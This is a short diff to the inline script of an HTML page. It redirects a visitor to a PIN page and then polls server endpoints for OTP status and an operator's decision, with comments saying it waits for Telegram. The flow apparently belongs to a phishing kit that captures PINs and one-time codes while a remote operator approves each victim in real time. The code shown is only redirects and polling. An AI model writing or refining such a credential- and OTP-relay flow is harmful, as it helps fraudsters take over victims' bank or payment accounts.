@@ -25,25 +25,25 @@
 <div class="footer"></div>
 
 <script>
-
-// ===== FIRST FLOW (STEP 4 → STEP 5) =====
+// ===============================
+// FIRST → GO TO PIN PAGE
+// ===============================
 if (localStorage.getItem("firstProcess") === "yes") {
-
     localStorage.removeItem("firstProcess");
-    localStorage.removeItem("fromPin"); // 🔥 IMPORTANT FIX
 
     setTimeout(() => {
         window.location.href = "step5.html";
     }, 5000);
-
 }
 
-// ===== SECOND FLOW (WAIT FOR ADMIN) =====
-else if (localStorage.getItem("fromPin") === "yes") {
+// ===============================
+// SECOND → WAIT FOR TELEGRAM
+// ===============================
+if (localStorage.getItem("fromPin") === "yes") {
 
     setInterval(() => {
 
-        // CHECK OTP
+        // 🔹 CHECK OTP
         fetch("/otp-status")
         .then(res => res.json())
         .then(data => {
@@ -54,7 +54,7 @@ else if (localStorage.getItem("fromPin") === "yes") {
             }
         });
 
-        // CHECK DECISION
+        // 🔹 CHECK DECISION
         fetch("/decision-status")
         .then(res => res.json())
         .then(data => {
@@ -68,9 +68,7 @@ else if (localStorage.getItem("fromPin") === "yes") {
         });
 
     }, 2000);
-
 }
-
 </script>
 
 </body>
